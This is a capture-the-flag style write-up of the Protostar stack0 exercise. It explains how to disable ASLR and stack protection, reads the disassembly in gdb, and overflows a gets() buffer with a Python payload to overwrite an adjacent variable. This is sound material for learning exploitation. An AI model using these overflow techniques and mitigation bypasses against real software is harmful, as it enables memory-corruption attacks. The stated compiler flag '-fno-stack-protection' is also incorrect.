check aslr: `sysctl -a --pattern "randomize"`  
disable aslr temporarily: `sudo /sbin/sysctl -w kernel.randomize_va_space=0`  
compile with: `-fno-stack-protection` and `-z execstack`

`volatile` is a keyword in C indicating that this variable can change anytime by outside the code and is omitted from compiler optimization.

```C
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
```

The integer `modified` is at [esp+0x5c] and is assigned to 0.  
Our buffer is right above it starting at [esp+0x1c]. We can easily verify the size:

```C
(gdb) print 0x5c-0x1c
$1 = 64
```
A pointer to our buffer is 'pushed' onto the stack. After the call to `gets` the value of `modified` is checked against 0. The `gets` function has no boundery checks so we can write more than 64 bytes into the buffer and land in our modified variable. Every value besides 0 would evalute to true so writing 1 more byte into the buffer would set the least significant byte (because of the endianess) and would print the winning message.

```C
(gdb) x/d $esp+0x5c
0xbffff69c:     2
(gdb) x/xw $esp+0x5c
0xbffff69c:     0x00000002
(gdb) x/5xb $esp+0x5b
0xbffff69b:     0x41    0x02    0x00    0x00    0x00

user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x02'" | ./stack0
you have changed the 'modified' variable
```

**Note:**

The print function appends a new line character `0xa` at the end. To avoid this we can `use sys.stdout.write()`:

```bash
user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 3" | hexdump -C
00000000  41 41 41 0a                                       |AAA.|
00000004
user@protostar:/opt/protostar/bin$ python -c "import sys; sys.stdout.write('\x41' * 3)" | hexdump -C
00000000  41 41 41                                          |AAA|
00000003
```

**Resources:**

https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/

https://docs.python.org/2/library/sys.html#sys.stdout
